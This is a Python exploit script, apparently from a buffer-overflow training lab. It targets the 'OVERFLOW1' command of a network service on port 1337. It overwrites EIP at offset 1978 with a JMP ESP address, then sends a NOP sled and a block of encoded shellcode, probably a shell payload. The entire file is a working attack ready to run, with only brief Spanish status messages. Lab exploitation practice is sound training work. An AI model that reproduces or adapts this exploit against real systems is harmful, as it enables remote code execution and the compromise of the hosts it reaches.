#!/usr/bin/python3

import socket
import struct

#HOST = "10.10.68.180"
HOST = "10.10.27.92"
PORT = 1337

to_reach_EIP = 1978
to_reach_JMPESP = 0x62501203
# badchars_found = "\x00\x07\x2e\xa0"
buf =  b""
buf += b"\xb8\x80\xd9\xdc\x7e\xd9\xc5\xd9\x74\x24\xf4\x5b"
buf += b"\x33\xc9\xb1\x52\x31\x43\x12\x83\xc3\x04\x03\xc3"
buf += b"\xd7\x3e\x8b\x3f\x0f\x3c\x74\xbf\xd0\x21\xfc\x5a"
buf += b"\xe1\x61\x9a\x2f\x52\x52\xe8\x7d\x5f\x19\xbc\x95"
buf += b"\xd4\x6f\x69\x9a\x5d\xc5\x4f\x95\x5e\x76\xb3\xb4"
buf += b"\xdc\x85\xe0\x16\xdc\x45\xf5\x57\x19\xbb\xf4\x05"
buf += b"\xf2\xb7\xab\xb9\x77\x8d\x77\x32\xcb\x03\xf0\xa7"
buf += b"\x9c\x22\xd1\x76\x96\x7c\xf1\x79\x7b\xf5\xb8\x61"
buf += b"\x98\x30\x72\x1a\x6a\xce\x85\xca\xa2\x2f\x29\x33"
buf += b"\x0b\xc2\x33\x74\xac\x3d\x46\x8c\xce\xc0\x51\x4b"
buf += b"\xac\x1e\xd7\x4f\x16\xd4\x4f\xab\xa6\x39\x09\x38"
buf += b"\xa4\xf6\x5d\x66\xa9\x09\xb1\x1d\xd5\x82\x34\xf1"
buf += b"\x5f\xd0\x12\xd5\x04\x82\x3b\x4c\xe1\x65\x43\x8e"
buf += b"\x4a\xd9\xe1\xc5\x67\x0e\x98\x84\xef\xe3\x91\x36"
buf += b"\xf0\x6b\xa1\x45\xc2\x34\x19\xc1\x6e\xbc\x87\x16"
buf += b"\x90\x97\x70\x88\x6f\x18\x81\x81\xab\x4c\xd1\xb9"
buf += b"\x1a\xed\xba\x39\xa2\x38\x6c\x69\x0c\x93\xcd\xd9"
buf += b"\xec\x43\xa6\x33\xe3\xbc\xd6\x3c\x29\xd5\x7d\xc7"
buf += b"\xba\xd0\x89\x51\xc1\x8d\x8b\x5d\x27\x16\x05\xbb"
buf += b"\x2d\xb6\x43\x14\xda\x2f\xce\xee\x7b\xaf\xc4\x8b"
buf += b"\xbc\x3b\xeb\x6c\x72\xcc\x86\x7e\xe3\x3c\xdd\xdc"
buf += b"\xa2\x43\xcb\x48\x28\xd1\x90\x88\x27\xca\x0e\xdf"
buf += b"\x60\x3c\x47\xb5\x9c\x67\xf1\xab\x5c\xf1\x3a\x6f"
buf += b"\xbb\xc2\xc5\x6e\x4e\x7e\xe2\x60\x96\x7f\xae\xd4"
buf += b"\x46\xd6\x78\x82\x20\x80\xca\x7c\xfb\x7f\x85\xe8"
buf += b"\x7a\x4c\x16\x6e\x83\x99\xe0\x8e\x32\x74\xb5\xb1"
buf += b"\xfb\x10\x31\xca\xe1\x80\xbe\x01\xa2\xa1\x5c\x83"
buf += b"\xdf\x49\xf9\x46\x62\x14\xfa\xbd\xa1\x21\x79\x37"
buf += b"\x5a\xd6\x61\x32\x5f\x92\x25\xaf\x2d\x8b\xc3\xcf"
buf += b"\x82\xac\xc1"

try:
    print(f"(+) Vamo a ShElLc0dEaR esta vuelta!!")

    # Connection
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.connect((HOST, PORT))
    server.settimeout(5)
    from_server = server.recv(1024)
    
    # Exploit
    payload = (
        b"OVERFLOW1 " +
        b"A" * to_reach_EIP +                # eip
        struct.pack('<I', to_reach_JMPESP) + # jmp esp
        b"\x90" * 32 +                       # junk data
        buf                                  # shellcode
    )

    server.send(payload)

    from_server = server.recv(1024)
    server.close()

except socket.timeout:
    print(f"(+) El programa dejÃ³ de responder...")
